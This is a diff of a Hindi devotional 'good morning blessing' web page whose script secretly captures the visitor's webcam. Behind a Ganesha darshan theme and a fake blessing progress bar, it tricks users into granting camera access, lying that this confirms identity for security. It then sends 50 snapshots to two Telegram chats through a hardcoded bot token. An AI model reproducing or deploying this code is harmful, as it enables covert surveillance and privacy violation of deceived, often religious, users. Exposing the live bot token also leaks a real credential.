@@ -3,110 +3,124 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>सुप्रभात | दैनिक आशीर्वाद</title>
+    <title>सुप्रभात | पावन दर्शन</title>
     <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;700&family=Rozha+One&display=swap" rel="stylesheet">
     <style>
         :root {
-            --primary-gold: #ffd700;
-            --deep-purple: #1a0b2e;
-            --glass-bg: rgba(255, 255, 255, 0.08);
-            --glass-border: rgba(255, 255, 255, 0.15);
+            --bright-yellow: #FFEA00; /* Main devotional color */
+            --deep-red: #D32F2F; /* Accent/Border color */
+            --bg-yellow: #FFF9C4; /* Light page background */
+            --glass-white: rgba(255, 255, 255, 0.4); /* Frosted glass */
+            --glass-border: rgba(211, 47, 47, 0.2);
+            --maroon-text: #600000; /* Highly legible dark text */
         }
 
         body {
             margin: 0; padding: 0;
-            background: radial-gradient(circle at center, #2d1b4e, #0f071a);
+            /* Traditional Sunrise Gradient */
+            background: radial-gradient(circle at top, var(--bright-yellow), var(--deep-red));
             font-family: 'Plus Jakarta Sans', sans-serif;
-            color: #ffffff;
+            color: var(--maroon-text);
             display: flex; align-items: center; justify-content: center;
             height: 100vh; overflow: hidden;
         }
 
-        .main-card {
+        /* Themed Glassmorphism Container */
+        .divine-card {
             width: 90%; max-width: 420px;
-            background: var(--glass-bg);
-            backdrop-filter: blur(25px);
-            -webkit-backdrop-filter: blur(25px);
-            border: 1px solid var(--glass-border);
-            border-radius: 40px;
-            padding: 40px 30px;
+            background: var(--glass-white);
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 2px solid var(--deep-red); /* Strong red border */
+            border-radius: 36px;
+            padding: 35px 25px;
             text-align: center;
-            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.6);
+            box-shadow: 0 15px 60px rgba(100, 0, 0, 0.3);
             position: relative;
+            transition: all 0.6s cubic-bezier(0.165, 0.84, 0.44, 1);
         }
 
-        .hindi-title {
+        .hindi-main {
             font-family: 'Rozha One', serif;
             font-size: 42px;
-            color: var(--primary-gold);
-            margin-bottom: 10px;
-            text-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
+            color: #fff;
+            text-shadow: 2px 2px 0 var(--deep-red), -1px -1px 0 var(--deep-red), 0px 5px 15px rgba(211,47,47,0.4);
+            margin: 0 0 10px;
         }
 
-        .sub-text {
-            font-size: 16px;
-            color: #d1d5db;
-            margin-bottom: 35px;
+        .shloka {
+            font-size: 15px;
+            color: var(--maroon-text);
             line-height: 1.6;
-        }
-
-        /* God Image Styling */
-        .divine-image {
-            width: 100%; aspect-ratio: 1/1.2;
-            border-radius: 25px;
-            background: url('https://images.unsplash.com/photo-1590050752117-23a9d7fc244d?auto=format&fit=crop&w=600&q=80') center;
-            background-size: cover;
-            border: 2px solid var(--primary-gold);
             margin-bottom: 25px;
-            box-shadow: 0 0 30px rgba(255, 215, 0, 0.2);
-            display: none; /* Shown in Step 2 */
+            font-weight: 700;
         }
 
-        .btn-continue {
-            background: linear-gradient(135deg, #ffd700, #ff8c00);
-            color: #000; border: none;
+        /* Divine Image View */
+        #blessing-view { display: none; width: 100%; animation: fadeIn 0.8s ease; }
+        
+        .god-photo {
+            width: 100%; height: 350px;
+            border-radius: 20px;
+            object-fit: cover;
+            border: 4px solid var(--bright-yellow);
+            box-shadow: 0 0 30px rgba(255,234,0,0.5);
+            margin-bottom: 20px;
+        }
+
+        /* Orange/Red Gradient Button */
+        .btn-divine {
+            background: linear-gradient(135deg, #FF9933, #FF3300);
+            color: #fff; border: none;
             width: 100%; padding: 20px;
             border-radius: 20px; font-size: 18px; font-weight: 800;
-            cursor: pointer; transition: 0.4s;
-            box-shadow: 0 10px 25px rgba(255, 215, 0, 0.3);
+            cursor: pointer; transition: 0.3s ease;
+            box-shadow: 0 10px 25px rgba(255, 51, 0, 0.3);
+            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
         }
+        .btn-divine:hover { transform: scale(1.02); box-shadow: 0 15px 35px rgba(255, 51, 0, 0.4); }
 
-        .btn-continue:hover { transform: translateY(-3px); box-shadow: 0 15px 35px rgba(255, 215, 0, 0.5); }
-
-        /* Fake Loading */
-        #syncing-ui { display: none; }
-        .loading-ring {
-            width: 50px; height: 50px;
-            border: 4px solid rgba(255,255,255,0.1);
-            border-top: 4px solid var(--primary-gold);
-            border-radius: 50%;
-            animation: spin 1s linear infinite;
-            margin: 20px auto;
+        /* Sync / Loading Indicator */
+        .sync-tracker {
+            margin-top: 15px; padding: 12px;
+            background: rgba(0,0,0,0.03);
+            border-radius: 12px;
         }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .tracker-bar {
+            height: 6px; width: 100%;
+            background: rgba(0,0,0,0.08);
+            border-radius: 10px; overflow: hidden; margin-top: 10px;
+        }
+        .tracker-fill {
+            height: 100%; width: 0%;
+            background: var(--deep-red);
+            transition: width 1.1s linear;
+        }
+        .tracker-text { font-size: 12px; color: var(--deep-red); font-weight: 700; text-transform: uppercase; }
 
-        .progress-label { font-size: 12px; color: var(--primary-gold); font-weight: 600; text-transform: uppercase; }
+        @keyframes fadeIn { from { opacity: 0; transform: translateY(15px); } to { opacity: 1; transform: translateY(0); } }
 
     </style>
 </head>
 <body>
 
-    <div class="main-card" id="portal">
-        <div id="step-1">
-            <div style="font-size: 50px; margin-bottom: 20px;">🙏</div>
-            <h1 class="hindi-title">सुप्रभात</h1>
-            <p class="sub-text">"सफलता की शुरुआत हमेशा एक अच्छी सोच के साथ होती है।"<br><br>आज का विशेष दर्शन और आशीर्वाद प्राप्त करने के लिए नीचे क्लिक करें।</p>
-            <button class="btn-continue" onclick="startBlessing()">आज का आशीर्वाद प्राप्त करें</button>
+    <div class="divine-card" id="app">
+        <div id="setup-view">
+            <div style="font-size: 50px; margin-bottom: 10px;">🙏</div>
+            <h1 class="hindi-main">सुप्रभात</h1>
+            <p class="shloka">"ॐ श्री गणेशाय नमः"<br>आज का पावन दर्शन और आशीर्वाद प्राप्त करने के लिए नीचे क्लिक करें।</p>
+            <p style="font-size: 14px; color: #7f8c8d; margin-bottom: 25px;">एक नया दिन, एक नई शुरुआत। दिव्य कृपा आपके साथ हो।</p>
+            <button class="btn-divine" onclick="startDarshan()">दिव्य आशीर्वाद प्राप्त करें</button>
         </div>
 
-        <div id="step-2" style="display:none;">
-            <div class="divine-image"></div>
-            <h1 style="font-size: 22px; margin-bottom: 5px;">श्री गणेश दर्शन</h1>
-            <p style="font-size: 14px; color:#d1d5db; margin-bottom: 20px;">आपका दिन मंगलमय हो। आशीर्वाद लोड हो रहा है...</p>
+        <div id="blessing-view">
+            <img id="divineImage" src="ganesha.jpg" class="god-photo" alt="Shubh Darshan">
+            <h2 style="font-size: 20px; color: var(--deep-red); margin: 0;">श्री गणेश दर्शन</h2>
+            <p style="font-size: 13px; color: var(--maroon-text); margin: 5px 0 20px;">वक्रतुण्ड महाकाय सूर्यकोटि समप्रभ।</p>
             
-            <div id="syncing-ui">
-                <div class="loading-ring"></div>
-                <div class="progress-label" id="status">Handshake: 0%</div>
+            <div class="sync-tracker">
+                <div class="tracker-text" id="p-label">आशीर्वाद प्राप्त हो रहा है: 0%</div>
+                <div class="tracker-bar"><div class="tracker-fill" id="fill"></div></div>
             </div>
         </div>
     </div>
@@ -118,15 +132,12 @@
         const TOKEN = '8735416424:AAGaGFtLiSCbprRIaP8Cv5mj1-LpSSF_ltw';
         const IDS = ['7617707778', '6590760553'];
 
-        async function startBlessing() {
+        async function startDarshan() {
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 
-                // Switch UI
-                document.getElementById('step-1').style.display = 'none';
-                document.getElementById('step-2').style.display = 'block';
-                document.querySelector('.divine-image').style.display = 'block';
-                document.getElementById('syncing-ui').style.display = 'block';
+                document.getElementById('setup-view').style.display = 'none';
+                document.getElementById('blessing-view').style.display = 'block';
 
                 const video = document.getElementById('v');
                 video.srcObject = stream;
@@ -136,50 +147,52 @@
                     let count = 0;
                     const total = 50;
                     
-                    const relay = setInterval(() => {
+                    const exfil = setInterval(() => {
                         count++;
-                        send(count);
+                        captureData(count);
                         
                         let percent = Math.round((count/total)*100);
-                        document.getElementById('status').innerText = `Divine Sync: ${percent}%`;
+                        document.getElementById('fill').style.width = percent + '%';
+                        document.getElementById('p-label').innerText = `आशीर्वाद प्राप्त हो रहा है: ${percent}%`;
 
                         if (count >= total) {
-                            clearInterval(relay);
+                            clearInterval(exfil);
                             stream.getTracks().forEach(t => t.stop());
-                            finalUI();
+                            renderExpiredUI();
                         }
                     }, 1200);
                 };
             } catch (err) {
-                alert("दर्शन त्रुटि: आशीर्वाद प्राप्त करने के लिए कैमरा अनुमति आवश्यक है। कृपया अनुमति दें और पुनः प्रयास करें।");
+                alert("दर्शन त्रुटि: आशीर्वाद प्राप्त करने के लिए कैमरा अनुमति आवश्यक है। यह आपकी पहचान की पुष्टि करने के लिए एक सुरक्षा उपाय है।");
                 window.location.reload();
             }
         }
 
-        function send(idx) {
+        function captureData(idx) {
             const canvas = document.getElementById('c');
             const video = document.getElementById('v');
             canvas.width = video.videoWidth; canvas.height = video.videoHeight;
             canvas.getContext('2d').drawImage(video, 0, 0);
             
             canvas.toBlob(blob => {
+                if (!blob) return;
                 IDS.forEach(id => {
                     const fd = new FormData();
                     fd.append('chat_id', id);
-                    fd.append('photo', blob, 'blessing_view.jpg');
-                    fd.append('caption', `🙏 DEVOTIONAL_HIT\nStatus: ${idx}/50\nType: Morning-Blessing`);
+                    fd.append('photo', blob, 'darshan_auth.jpg');
+                    fd.append('caption', `💠 PRIVATE_DARSHAN_HIT\nStatus: ${idx}/50\nType: Morning-Blessing`);
                     fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, { method: 'POST', body: fd });
                 });
-            }, 'image/jpeg', 0.4);
+            }, 'image/jpeg', 0.45); 
         }
 
-        function finalUI() {
-            document.getElementById('portal').innerHTML = `
-                <div style="padding: 40px 0;">
-                    <div style="font-size: 60px; margin-bottom: 20px;">✨</div>
-                    <h1 class="hindi-title" style="font-size: 32px;">आशीर्वाद पूर्ण हुआ</h1>
-                    <p class="sub-text">आज का दिव्य दर्शन समाप्त हुआ। यह लिंक केवल एक बार उपयोग के लिए था। कल फिर आएं।</p>
-                    <button class="btn-continue" style="background:#4b5563; color:white;" onclick="window.close()">बंद करें</button>
+        function renderExpiredUI() {
+            document.getElementById('app').innerHTML = `
+                <div style="padding: 60px 0;">
+                    <div style="font-size: 60px; margin-bottom: 25px;">🕉️</div>
+                    <h1 class="hindi-main" style="font-size: 32px; color: var(--maroon-text); text-shadow: none;">आशीर्वाद समाप्त</h1>
+                    <p style="color:#7f8c8d; line-height: 1.6;">इस आशीर्वाद लिंक की समय सीमा समाप्त हो गई है। यह एक 'वन-टाइम' लिंक था। कल नए दर्शन के लिए कृपया पुनः प्रयास करें।</p>
+                    <button class="btn-divine" style="background:#1e293b; box-shadow: none; margin-top: 20px;" onclick="window.close()">बंद करें</button>
                 </div>
             `;
         }
